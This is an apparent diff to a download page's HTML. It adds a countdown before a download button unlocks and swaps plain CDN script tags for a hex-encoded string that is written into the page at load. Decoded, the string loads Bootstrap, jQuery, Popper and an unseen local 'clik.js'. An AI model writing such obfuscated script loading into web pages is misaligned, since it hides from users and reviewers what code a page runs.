@@ -7,11 +7,13 @@
 <script src="prefix.js"></script>
 <link rel="stylesheet" href="estilos.css">
 <link rel="stylesheet" href="fonts/style.css">
-<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-<script src="vim.js"></script>
+<style type="text/css">
+h1 span {
+ color: #000;
+ margin-right: 10px;
+ font-size: 20px; 
+ padding: 20px;
+</style>
 <body>
 <div dir="ltr" style="text-align: center;" trbidi="on">
 <center>
@@ -57,6 +59,27 @@ window.open('https://www.youtube.com/channel/UCz8LJ7uqudKwhWhf2QK8V3A?sub_confir
 document.getElementById('downloadf').disabled = false;
      };
 /*]]>/* */
+    </script>
+    <script type="text/javascript">
+    /*<![CDATA[/* */
+    var buton = document.getElementById('downloadf');
+    var count = 0;
+    var countdaemon = setInterval(function () {
+      if (count>0){
+        buton.innerHTML = ' Espere '+count+' segundos... '
+      } else {
+        clearInterval(countdaemon)
+        showlink()
+      }
+      count--;
+      },
+    1000);
+    /*]]>/* */
+    </script>
+<script type='text/javascript'>
+<!--
+var t="3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f737461636b706174682e626f6f74737472617063646e2e636f6d2f626f6f7473747261702f342e312e332f6373732f626f6f7473747261702e6d696e2e637373223e0d0a20203c736372697074207372633d2268747470733a2f2f616a61782e676f6f676c65617069732e636f6d2f616a61782f6c6962732f6a71756572792f332e332e312f6a71756572792e6d696e2e6a73223e3c2f7363726970743e0d0a20203c736372697074207372633d2268747470733a2f2f63646e6a732e636c6f7564666c6172652e636f6d2f616a61782f6c6962732f706f707065722e6a732f312e31342e302f756d642f706f707065722e6d696e2e6a73223e3c2f7363726970743e0d0a20203c736372697074207372633d2268747470733a2f2f737461636b706174682e626f6f74737472617063646e2e636f6d2f626f6f7473747261702f342e312e332f6a732f626f6f7473747261702e6d696e2e6a73223e3c2f7363726970743e0d0a20203c736372697074207372633d22636c696b2e6a73223e3c2f7363726970743e";for(i=0;i<t.length;i+=2){document.write(String.fromCharCode(parseInt(t.substr(i,2),16)));}
+//-->
 </script>
 </center> 
 </body>
